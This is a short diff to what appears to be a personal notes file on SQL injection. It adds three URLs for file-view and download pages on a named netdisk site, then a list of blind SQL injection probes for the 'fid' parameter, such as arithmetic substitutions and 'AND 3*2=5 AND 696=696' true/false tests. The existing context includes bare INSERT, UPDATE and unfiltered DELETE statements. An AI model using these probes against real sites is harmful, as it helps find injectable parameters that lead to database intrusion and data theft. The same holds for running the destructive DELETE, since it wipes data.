@@ -42,3 +42,20 @@ sql:
     INSERT into information(id,title) values('1','biaoti');
     update information set;
     delete from information;
+pid:
+    http://www.zhongsou.net/space/netdisk/index.php?op=f_filecontent&igId=%E5%B0%8F%E5%85%94%E5%AD%90%E4%B9%96%E4%B9%96&fid=102987
+    http://www.zhongsou.net/space/netdisk/index.php?op=f_downloadfile&igId=%E5%B0%8F%E5%85%94%E5%AD%90%E4%B9%96%E4%B9%96&fid=102987
+    http://www.zhongsou.net/space/netdisk/index.php?op=f_openfile&igId=%E5%B0%8F%E5%85%94%E5%AD%90%E4%B9%96%E4%B9%96&fid=102987
+fid:
+    0+0+0+12671 =>
+    0+696*691+12671 =>
+    12681-5-2-999 =>
+    12681-5-2-3 =>
+    12681-2*5+0+0+1-1 =>
+    12681-2*6+0+0+1-1 =>
+    12671 AND 2+1-1-1=1 AND 696=696 =>
+    12671 AND 3+1-1-1=1 AND 696=696 =>
+    12671 AND 3*2=5 AND 696=696 =>
+    12671 AND 3*2=6 AND 696=696 =>
+    12671 AND 3*2*0=6 AND 696=696 =>
+    12671 AND 3*2*1=6 AND 696=696 =>
